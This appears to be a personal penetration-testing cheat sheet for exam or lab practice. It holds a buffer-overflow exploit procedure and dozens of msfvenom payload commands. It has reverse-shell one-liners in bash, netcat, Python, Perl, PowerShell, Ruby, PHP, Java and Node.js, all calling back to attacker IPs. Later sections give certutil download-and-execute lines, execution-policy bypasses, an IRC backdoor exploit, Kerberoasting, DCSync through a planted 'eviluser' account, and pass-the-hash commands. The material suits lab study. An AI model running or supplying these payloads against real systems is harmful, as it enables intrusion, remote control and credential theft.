# Buffer overflow
------------------------
- Buffer overflow process, get this down.
    - NOTE: if registers disappears use "ALT+C" to get it back
    - Process
        1. Fuzz EIP: Run fuzzy with just one char for an amount of times. You 
           may need to use "\r\n" at the end for the values to take
            - Fuzzy location: ~/notes/exam/BOF/fuzzy2.py
        2. Create pattern: 
            > msf-pattern_create -l 800
        3. Determine offset 
            > msf-pattern_offset -l 800 -q 35724134
                - what ever value given is what "A" needs to be
            - Adjust fuzzer to use A+B+C to confirm 42424242 shows up in EIP
        4. Find bad chars
            - Run fuzzer now with only output of "badchars" AFTER the 'A's
            - Dump ESP (You may need to search for chars being sent)
            - Copy Immunity Debugger Hex dump output. Only copy characters that
              Need to be checked. Paste into a file on Kali.
                > BadCharChecker filename
            - Repeate until BadCharChecker gives finds all Bad chars.
        5. Find a JMP ESP address in Immunity
            - Run "!mona modules", find a dependency that has "FALSE" for all. 
              (Or at least the most FALSE's)
            - Run "!mona find -s "\xff\xe4" -m "dependencyfoundname.exe""
            - Make note of found address. Make sure address does not create a
              "00" on little endian
            - Convert to little endian and put in code "LEC 311712F3"
        6. Test with a breaker
            - Run "Go To address" (Button looks like ->| ). Enter the jmp esp address (Not little converted)
            - select F2 to add breaker
            - Start program F9
            - Run fuzzer now with A + eip + C
            - Make sure JMP ESP address shows up in EIP.
        7. Create shell code and exploit
            - see venom section
        8. Test exploit
            - Copy shell code over
            - Add nop sled (many \x90\x90.., up to 11-20 might need to play with this)
            - output A + eip + nop + shellcodeA
            - set up listener "nc -nlvp 4444"
            - Run exploit

        Uh oh... its not working..
            - Reset the debug machines and run through the process again, did JMP ESP change? adjust and try running again
            - Did you try adjusting your "new line" end? ("\r\n" or "\n"?)
            - try different encoding. You can leave off "-e x86/shikata_ga_nai" in your msfvenom command and an encoding will be auto selected
            - Try longer nop sled yet?
            - Change different reverse shell port
            - Restart the VPN, with new RS port

## Other info below for buffer overflow:
    - Check register hex values
        > msf-nasm_shell
    - Convert hex to ascii
        > echo <hex> | xxd -r -p
    - Linux gcc compiling commands
        > i686-w64-mingw32-gcc exploit.good2.c -o exploitc.asx -lws2_32

# Reading memory dumps:
-----------------------
- Volatility:
    > systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
    > volatility kdbgscan -f SILO-20180105-221806.dmp
    > volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hivelist
    > volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000
        - hash should now be obtained

# MSFvenom
----------
## NOTE: These sites are very helpful:
https://netsec.ws/?p=331
https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

## msfvenom help
- msfvenom platforms (OS)
    > msfvenom --list platform
- msfvenom payloads (OS+specific reverse)
    > msfvenom --list payloads

## Best buffer overflow shell code rev shells
    - Windows:
        > msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.156 lport=4444 -f python -e x86/shikata_ga_nai -b "\x00\x0a"
    - Linux:
        > msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.156 LPORT=4444 -b "\x00\x0a" -f py -v shellcode
## Windows Shell code
    - Windows 32bit single stage reverse, output shellcode python:
        > msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.156 LPORT=4444 -f python -e x86/shikata_ga_nai -b "\x00\x0a"
        > msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f python -e x86/shikata_ga_nai -b "\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    - Windows 32bit single stage reverse, output shellcode c:
        > msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.156 LPORT=4444 -f c -e x86/shikata_ga_nai -b "\x00\x0a"
    - Windows 32bit single stage reverse, output raw output:
        > msfvenom -p windows/shell_reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=192.168.49.156 LPORT=443
    - Windows 64bit single stage reverse, output C# dll format
        > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.118.3 LPORT=8081 -f dll -f csharp
## Windows Perform command
    - Windows 64bit single stage reverse, perform command python:
        > msfvenom -p windows/exec CMD='c:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.18 4445' -b '\x00\x0a\x0d' -f py -v payload
## Windows Single Stage
    - Winodws 64bit single stage reverse, output dll
        > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.156 LPORT=4445 -f dll -o hijackme.dll
    - Winodws 64bit single stage reverse, output msi
        > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.156 LPORT=4445 -f msi -o reverse.msi
    - Windows 32bit single stage reverse, output asp file:
        > msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.135 LPORT=4444 -f asp -o 1337.asp
    - Windows 32bit single stage reverse, output exe file:
        > msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.135 LPORT=8899 -f exe -o shellmeX86p8899.exe
        > sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.135 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o ~/SystemsHacked/10.11.1.5/ms17-010.exe
    - Windows 64bit single stage reverse, output exe file:
        > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.135 LPORT=8899 -f exe -o shellmeX64p8899.exe
        > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.156 LPORT=53 -f exe -o reverse.exe
## Windows Single Stage EternalBlue MS17-010
    - Windows 32bit single stage reverse, output exe file -- for 42315.py:
        > msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f exe > blue.exe
    - Windows 32bit single stage reverse, output exe file -- for sleepya:
        > sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.135 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o ~/SystemsHacked/10.11.1.5/ms17-010.exe

## Linux Single stage
    - Linux 32bit single stage reverse shell
        > msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f elf > 1337x86.esp
    - Linux 64bit single stage reverse shell
        > msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f elf > 1337x64.esp
    - Linux 64bit command
        > msfvenom -p linux/x64/exec CMD="ping -c 2 192.168.49.131" -f elf shell.elf
    - Linux 64bit shared libary
        - perform a ldd on the binary in question
            > ldd stupidbin
        - Check if you can write to any of the library paths, or the library is missing
        - create your own
            > msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=192.168.49.91 LPORT=21 -f elf-so -o utils.so


## Linux Perform a command
    - Windows 64bit single stage reverse, perform command python:
        > msfvenom -p linux/x86/exec CMD='/bin/bash -i >& /dev/tcp/10.10.14.28/4444 0>&1' -b '\x00\x0a\x0d' -f csv -v payload

## Linux Single stage shell code
    - Linux 32bit single stage reverse, output shell code python:
        > msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.156 LPORT=4444 -b "\x00\x0a" -f py -v shellcode

## Powershell
    - Windows 32bit single stage reverse, output powershell shell code:
        > msfvenom -p windows/meterpreter/reverse_tcp LHOST=191.168.119.135 LPORT=4444 -f powershell

## Java files
    - Windows single stage reverse, output jsp file:
        > msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.135 LPORT=443 -f raw -o bummer.jsp
    - Windows single stage reverse, output war file:
        > msfvenom -p java/shell_reverse_tcp lhost=10.10.14.18 lport=4444 -f war -o pwn.war

## Wordpress plugin
    - Wordpress php used for plugins
        > msfvenom -p php/reverse_php LHOST=192.168.49.89 LPORT=80 -f raw > shell.php
        - Go to the "wordpress" section of this document for more info on how to create a plugin and upload

## Ruby
    - ruby reverse shell
    > msfvenom -p cmd/unix/reverse_ruby lhost=192.168.1.103 lport=5555 R

## Metasploit
### Windows Multi Stage
    - Windows 32bit multi stage reverse, output .exe:
        > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.135 LPORT=4444 -f exe -o shellmeX86p9999MP.exe
    - In msfconsole
        > use multi/handler
        > set payload windows/meterpreter/reverse_https
        > set LHOST
        > set LPORT
        > show options
        > exploit -j
        > jobs
        > jobs -i 0

### Windows SMB login
    > use auxiliary/scanner/smb/smb_login
    > set rhosts 192.168.1.105
    > set user_file user.txt
    > set pass_file pass.txt
    > set smbdomain ignite
    > exploit

### Linux Multi stage
    - Linux 32bit multi stage reverse, output shellcode:
        > msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.119.135 LPORT=4444 -f py -v shellcode
    - In msfconsole
        > use multi/handler
        > set payload linux/x86/meterpreter/reverse_tcp
        > set LHOST
        > set LPORT
        > show options
        > exploit -j
        > jobs
        > jobs -i 0


# Reverse / Bind Shells (reverse shell)
------------------------
Linux Shell NOTE!!!!!!
    --- If RCE is not working, try /bin/sh instead of /bin/bash

- Bash:
    > bind > /bin/bash -i >& /dev/tcp/10.10.10.10/4443 0>&1
    > bind > /bin/bash -i >& /dev/tcp/192.168.49.91/80 0>&1
- netcat without -e flag
    > bind > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.1.156 4445 >/tmp/f
    > bind > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 9001 >/tmp/f
    > shell shock > rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>&1|nc%2010.10.14.18%20443%20>/tmp/f
- netcat linux (reverse shell)
    > listen > nc -nlvp 4443
    > bind > nc 10.10.10.10 4443 -e /bin/sh
- netcat linux (bind shell0
    > listen(victim) > nc -nlvp 4443 -e /bin/bash
    > bind > nc 10.10.10.10 4443 -e /bin/sh
- netcat windows (reverse shell)
    > listen > nc -nlvp 4443
    > bind > nc.exe 10.10.10.10 4443 -e cmd.exe
- netcat windows (bind shell)
    > listen (victim) > nc.exe -nlvp 4444 -e cmd.exe
    > bind > nc.exe -nv 10.10.10.10 4444

- socat Linux (reverse shell) NOTE! "-d -d" shows log output
    > listen (kali) > sudo socat -d -d TCP4-LISTEN:443 STDOUT
    > bind (linux) > sudo -u root /usr/bin/socat TCP4:10.9.202.21:443 EXEC:/bin/bash

- python
    > bind > os.system('bash -c "bash -i >& /dev/tcp/10.10.14.28/4446 0>&1"')
    > bind > os.system('socat TCP:192.168.49.153:80 EXEC:bash')
    > bind > python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    - If creating actual file (like reverse.py) add this to the file and download with wget: 
        import socket,subprocess,os
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.10.14.28",4445))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["/bin/bash","-i"])
    > ping > python -c 'import os;host="192.168.49.104";pingme=os.system("ping -c 2 " + host);'
    > ping > python -c 'import os;os.system("ping -c 2 192.168.49.153");'
    > eval being used on text box > os.system('bash -c "bash -i >& /dev/tcp/192.168.49.165/5555 0>&1"')#
- perl
    > bind > perl -e 'use Socket;$i="10.10.10.10";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
- powershell:
    > reverse > powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.18',4446);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    > bind  > powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
    - For code injection
        > echo |set /p="$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
- Ruby
    > ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
- PHP (Try with all versions of PHP)
    > php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
    - use a reverse webshell
        NOTE: try changing to "phtml" if .php extension cant be used
        - Windows
            > /usr/share/webshells/php/windows-php-reverse-shell/wrs.php
        - Linux
            > /usr/share/webshells/php/php-reverse-shell.php

- Java
    > r = Runtime.getRuntime()
      p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
      p.waitForA)
    - Link provides details on oracle java reverse shell by decenteralization
        http://obtruse.syfrtext.com/2018/07/oracle-privilege-escalation-via.html
- Nodejs:
    - Create a "reverse.sh"
    (function(){
    var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.14.28", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
    })();

- egressbuster
    ! You must have access to the victim via webshell or some other means. Must be able to upload egressbuster.py to victum too
    - Upload "~/notes/exam/egressbuster/egressbuster.py" to the victim (or the .exe if windows).

        - On kali 
            > sudo python3 ./egress_listener.py 192.168.49.167 tun0 192.168.167.64 shell
            - "192.168.49.167" is kali tun0 ip, "192.168.167.64" is the victim interface

        - On victim 
            > ./egressbuster.py 192.168.49.167 1-65536 shell

    - wait for the listener to show ports that come through, these are usable!
    - then set up your own reversehell or use the one provided in egressbuster


# Transfer File
----------------
## Third party tools
    - netcat (From windows to kali):
        > kali > nc -l -p 4443 > root.txt
        > Windows > nc.exe -w 3 10.10.14.18 4443 < root.txt
    - netcat (From Kali to Windows):
        > windows > nc.exe -nlvp 127.0.0.1 4444 > incoming.exe
        > kali > nc -nv 192.168.119.135 4444 < /path/to/file.exe 
    - netcat (From Kali to Linux):
        > Linbox > nc -nlvp 3000 > incoming.sh
        > kali > nc -w 3 192.168.131.97 3000 < incoming.sh
    - netcat (From linux to Kali)
        > kali > nc -nlvp 3000 > incoming.exe
        > Linbox  > ./nc -w 3 10.10.14.18 3000 < incoming.txt
        OR
        > Linbox > cat file.exe | nc 192.168.119.135 3000
        - Make sure to CTRL-C from kali to end the session and send something else
    - socat:
        > server > sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
        > client > socat TCP4:192.168.1.177:443 file:recieved_secret_passwords.txt,create

## Windows Tools:
- certutil: Transfer encoded / decode:
  http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html 
  https://www.hackingarticles.in/windows-for-pentester-certutil/
    - On kali, convert file to base64
        > base64 dll.txt
    - Run webserver
        > python -m SimpleHTTPServer 8088
    - On windows
        > certutil.exe -urlcache -split -f http://192.168.1.110:8088/dll.txt dll.txt
        > certutil.exe -decode .\dll.txt mydll.dll
        > regsvr32 /s /u mydll.dll

    - On windows no encryption
        > certutil.exe -urlcache -split -f http://10.10.14.25:8088/nc.exe C:\Users\Public\Downloadsnc.exe
 
### Powershell transfer / bypass exeuction policy

- "Red team cheet sheet"
    https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70

- Check execution policy
    > Get-ExecutionPolicy
    > Get-ExecutionPolicy -List | Format-Table -AutoSize
    > Get-ExecutionPolicy -Scope CurrentUser
- Change execution policy
    > Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
- Bypass
    > powershell --executionPolicy bypass
    > powershell -c <cmd>
    > powershell -encodedcommand
    > $env:PSExecutionPolicyPreference="bypass"
- Run the script
    > powershell.exe -noprofile "<code>"
- Change to encoded bytes in powershell
    > $command = "Write-Host 'Hello, World'; calc.exe"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command);$encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand
- Invoke-Command
    > invoke-command -scriptblock {Write-Host "Hello dude"; calc.exe}
- Run the script (in base64)
    > run msfvenom powershell output (see above)
    > swap shell code in ~/notes/exam/reverseshell-from-msfshellcode.ps1
    > ~/notes/exam/ps_encoder.py -s reverseshell-from-msfshellcode.ps1 | xclip -sel clip
    > run msfconsole with multi/handler and listen
    > powershell.exe -noprofile -encodedCommand <base64code from xclip>
- Get-content
    > Get-Content .\script.ps1 | powershell.exe -noprofile -
- Disable by swapping out auth manager
    > function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}; Disable-ExecutionPolicy; .\yourscript.ps1
    


# Network enumeration
---------------------
## Auto Tools:
    - autorecon
        > sudo autorecon 10.11.1.100
    - nmapAutomator
        > nmapAutomator 10.11.1.100 Quick
        > nmapAutomator 10.11.1.100 Full
        > nmapAutomator 10.11.1.100 All

## Nmap:

### Most used nmap parameters
    - '-p-' Scan all TCP ports
    - '-sU' Scan UDP ports
        - '--top-ports <value>' Scan 0-<value> UDP ports
    - '-sV' Service and version scan
    - '-vv' Verbose output
    - '-oN <filename>' Send output to a file
    - '-sC' Script scanning
    - '-O' OS detection
        - '--osscan-guess' Guess os based on fingerprint

### scans examples:
    - Good site for nmap scans:
        - https://www.stationx.net/nmap-cheat-sheet/
        - https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html

### nmap Inital scans:
    - ping sweep:
        > nmap -sP 10.11.1.1-20
    - TCP syn sweep:
        > sudo nmap -sS 10.11.1.0/24

### The host wont respond to ping!!
    - sudo nmap -sS -Pn 192.168.103.66

### nmap speed up scan
    - Use the flag "-T4"

### nmap initial enumeration scans:
    > tnas 10.10.10.10 1,2,4,5
    `- sudo nmap -p- -sV -vv -oN _nmap_tcp_quick 10.10.10.97
    `- sudo nmap -sC -sV -p- -vv -oN _nmap_tcp_full 10.10.10.97
    `- sudo nmap -sU --top-ports 1000 -oN _nmap_udp_1000 10.10.10.100
    `- sudo nmap -O --osscan-guess -oN _nmap_os 10.10.10.97

### nmap scans:
    - TCP Scan (quick):
        > sudo nmap -sC -sV -vv -oA quick 10.10.10.10
    - TCP Scan (full):
        > sudo nmap -sC -sV -p- -vv -oA full 10.10.10.10
    - UDP Scan (quick):
        > sudo nmap -sU -sV -vv -oA quick_udp 10.10.10.10
    - UDP Scan (full):
        > sudo nmap -sC -sV -p- -vv -oA full 10.10.10.10
        > sudo nmap -sC -sV -O -oA initial 10.10.10.10
    - Port Knock:
        > knock 10.10.10.24 1706
        > for x in 7000 8000 9000; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 10.10.10.10; done

### nmap OS scan
    - OS Scan:
        > sudo nmap 192.168.1.1 -O --osscan-guess
        > sudo nmap 10.11.1.220 --script=smb-os-discovery

### nmap traceroute tcp
    > sudo nmap -Pn --traceroute -p 8000 destination.com

### netcat scans
    - Port Scanning (single host):
        - netcat: (TCP Scan)
            > nc -nvv -w 1 -z 10.11.1.220 3388-3390
        - netcat: (UDP Scan) 
            > nc -nv -u -z -w 1 10.11.1.115 160-162
        - Wireshark filter on [SYN,ACK] 
            - "tcp.flags==0x12"

### webDAV testing
    - davtest
        > davtest -url http://10.10.10.15
        - review what file types can be uploaded, upload with cadaver the file type.

### Other service scanning:

## IRC
    - irc (Unreal)
        > nc -nlvp 4444
        > nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.6 4444"  10.10.10.117
        > nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='nc 4444 -e /bin/sh 10.10.14.6' 10.10.10.117

## DNS and domain lookups
    - Try to find any type of domain on a website.
    - If https check certificate info, subject name may give it away 
    - You must edit your /etc/hosts file to add entries (<server ip> <specific domain to test>)
        - confirm with dig requests, need to get IP addresses back
        - dig 
            - query host
                > dig @10.10.10.161 forest.htb.local
            - request zone transfer
                > dig axfr @10.10.10.161 htb.local
            - Hostname
                - Must configure "search" groups. For netplan under nameservers add "search:" then add below "- your.domain"
                > dig +search A hostname @172.39.90.12
            - FQDN
                > dig A hostname.domain.com @172.39.90.12
            - PTR
                > dig -x 172.39.90.39 @172.39.90.12

    - Forward look up:
        > for ip in $(cat list.txt);do host $ip.megacorpone.com; done

    - IP address resolve hostnames:
        > for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"

    - Request zone transfer file:
        > host -l <domain name> <dns server address>
        > for hn in $(seq 1 3);do host -l megacorpone.com ns $hn.megacorpone.com; done
        > host -t ns megacorpone.com | cut -d " " -f 4

    - DNS enumeration:
        - dnsrecon:
            > dnsrecon -d megacorpone.com -t axfr 
            > dnsrecon -d megacorpone.com -D ~/list.txt -t brt
        - dnsenum:
            > dnsenum megacorpone.com
        - fierce:
            > fierce -dnsserver 10.10.10.100 -dns megacorpone.com

## LDAP
    - jxplorer
        > jxplorer
        - file > connect
            - Host: <IP address>
            - try anonymous login. If it does not work use a usename and password
            - Right click the domain "refresh"
    - ldapdomaindump (requires user creds)
        - NOTE: this may fail (get a UnicodeDecodeError) htb, PG, and oscp machines if the scheme is changed
            > ldapdomaindump 10.10.10.161 -u 'domain\username' -p 'password' -o /output/file/path --authtype SIMPLE
            > ldapdomaindump ldap://10.10.10.161
    - ldapsearch (null creds), if output "bind must be completed" or "operations error", you need creds. 
        - ldapsearch -h 10.10.10.100 389 -x -s base -b '' "(objectClass=*)" "*" +

        - NOTE: "-D" is the username --> 'domain\username'
                "-w" is hte passwrod --> 'password'
        - Dump hole database (WARNING: very large! output to file)
            > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "DC=htb,DC=local" > ldap-dump.txt
        - Check for access to user passwords
            > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "DC=htb,DC=local" | grep 'userpas"
        - Dump users
            > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Users,DC=htb,DC=local" > ldap-dump-users.txt
        - Dump computer
            > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Computers,DC=htb,DC=local" > ldap-dump-computers.txt
        - Dump Domain Admins
            > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Domain Admins,CN=Users,DC=htb,DC=local" > ldap-dump-users-domainAdmins.txt
        - Dump Enterprise Admins
            > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Enterprise Admins,CN=Users,DC=htb,DC=local" > ldap-dump-users-enterpriseAdmins.txt
        - Dump Administrators
            > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Administrators,CN=BuiltinDC=htb,DC=local" > ldap-dump-users-Administrators.txt
        - Dump Remote Desktop Group
            > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Remote Desktop Users,CN=BuiltinDC=htb,DC=local" > ldap-dump-users-RemoteDesktopUsers.txt
    - ldapgatherer
        > ldapgather -u '' -p '' -s 10.10.10.161 -d htb.local
    - ldapgatherer.py
        > ./ldapgatherer.py
    - python ldap3
        > python3
        >>> import ldap3
        >>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =389, use_ssl = False)
        >>> connection = ldap3.Connection(server)
        >>> connection.bind()
        True
        - Gather all info
        >>> server.info
        >>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
        True
        >> connection.entries
        - Dump all of ldap
        >> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
        True
        >>> connection.entries

## Kerberos
    - kerbrute (Brute force access)
        > kerbrute bruteuser --dc 10.10.10.161 -d htb.local -v -t 200 --safe /usr/share/wordlists/rockyou.txt sebastien
    - GetNPUsers.py (pull hash of each user)
        > for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
        - Or just run the following
            > GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request
    - Kerberoasting
        - Powershell
            > iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1") 
            > Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
        - GetUsersSPNs.py (pull hashes for specific users)
            > GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs -save -outputfile GetUsersSPNs.out
            - check .out file for ticket
    - Crack hash
        - pull hash with GetNPUsers.py, any lines found put the whole hash into a file.
            - Copy whole thing! "$krb5asrep$23$svc-alfresco@HTB:5208fc44fd91841c26f47b28712....etc."
        - use hashcat

            7500  | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols
            13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols
            18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols
            19600 | Kerberos 5, etype 17, TGS-REP                    | Network Protocols
            19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols
            19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols
            19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols

            > hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force
            > hashcat -m 13100 GetUsersSPNs.out /usr/share/wordlists/rockyou.txt --force

## Active Directory
    - Good links on how to use all of Impackets tools and running commands
        - https://neil-fox.github.io/Impacket-usage-&-detection/
        - https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
    - Must get access to system first (RDP, evil-winrm, telnet, etc.)
    - Enumeration
        - Data gathering
            - Local:
                - sharphound.ps1
                - sharphound.exe
            - Remote:
                - Bloodhound-python
                    > bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c All
                    - You should now have 4 .json files
        - Analyize 
            - Open neo4jdb (MAKE sure to check your /etc/hosts file and make sure "localhost 127.0.0.1" is set)
                > sudo neo4j console
            - Open bloodhound3 (DONT USE SUDO)
                > bloodhound
            - Login (neo4j/<your password>)
            - Select "upload data" on the right (Highlight all 4 .json files, and select "Upload")
            - Seach for your user you have access to top left ("svcalfresco@htb.local")
            - Select user in graph
            - Select "Node Info" on left
            - Select "Reachable high value targets"
    - Add a admin user (if you have found poorly configured group permissions to allow you to create users)
        - Download PowerView.ps1 onto the system first
            > certutil.exe -urlcache -split -f http://10.10.14.25:8088/PowerView.ps1 C:\Users\svc-alfresco\Downloads\PowerView.ps1
        - Run the following commands to create a user for Impacket to gather hashs with
            > Import-Module .\PowerView.ps1
            > net user eivluser password /add /domain
            > net group "Exchange Windows Permissions" /add eviluser
            > $pass = convertto-securestring 'password' -AsPlainText -Force
            > $cred = New-Object System.Management.Automation.PSCredential('htb\eviluser', $pass)
            > Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity rana -Rights DCSync
        - From Kali run the following to gather hashes
            > impacket-secretsdump htb.local/eviluser:password@10.10.10.161
        - Pass the hash
            > psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 -target-ip 10.10.10.161 administrator@10.10.10.161
            > pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 \\10.10.10.161 cmd.exe
